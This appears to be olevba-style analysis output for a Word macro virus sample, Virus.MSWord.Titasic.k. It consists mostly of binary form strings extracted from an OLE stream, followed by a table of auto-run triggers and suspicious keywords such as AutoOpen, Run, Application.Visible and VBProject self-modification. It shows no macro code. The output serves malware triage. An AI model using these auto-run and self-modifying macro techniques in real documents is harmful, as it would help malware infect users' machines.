- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������------���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������AAA��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ppp!!!!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p			---������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���---
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
888���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������444��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
///-Z�0a�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
||||||ppp
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---���������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!|||!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꜜ����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������777333��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9994i�8p�4h�###%%%000<<<(((
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---���������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$$$~~~!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꜜ����������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������555��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
...0a�0a�-Z�-Z�0a�4h�0a�###
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
888���������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p			---���������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---���������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꥥ�������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������???��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+++8p�@��<x�8p�1c�333������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������III��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4h�@��@��<x�:t褤�������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g						
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!888������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ϥ�����������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!��������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+++8p�@��<x�4h�<<<���������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!!!!!!!!!!!!!!!!!!!!!!$$$   
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ϛ�����!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&&&   
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ϥ��������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---��������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&&&)R�0a�4h�8p�<x�<x�4h�%%%555������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꮮ����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ϥ�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������---
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ϥ�����������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!�����������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0a�4h�8p�8p�4h�%%%***���������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����---!!!!!!!!!!!!!!!!!!!!!!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꮮ����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ϝ�����������///
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ϝ��������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�)))��������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(((!!!   )))...6m�<<<555������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������������zzz
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ϥ�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ϥ��������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꥥ�������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꜜ����������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꜜ�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ɣ�����������������������������������KKK��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
###���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
***������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꥥ����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ϥ��������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������������������???��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(((��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
888%%%<<<���������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꥥ�������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ϥ�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������������������555��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(((��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
***������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꜜ����������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꜜ����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꮮ����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꜜ�������������������������������������������+++
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+++������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꥥ����������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������CCC---
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���------------
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���000������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������<<<???�����������Ʒ��000000������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!!!!!!!!!!000���???<<<��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������˼�����������???444444???000!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������!!!������������|||!!!������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������---888������������CCCCCC���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������888---������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������888���������������������������888888���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������888������������������������������---!!!�������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������!!!!!!���������������������888���������������888���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������---!!!888������������������888888���������������CCC������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������---!!!������������������������CCC������������������888������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������------���������������������������������������������888888���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������888���������������������������������������������������888�����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������888���������������������������������������������������888������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������OOO���������������������������OOO������������������������CCC������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������CCC������������������������CCC������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������OOO������������������������CCC���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������CCC���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Pure Exit !
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
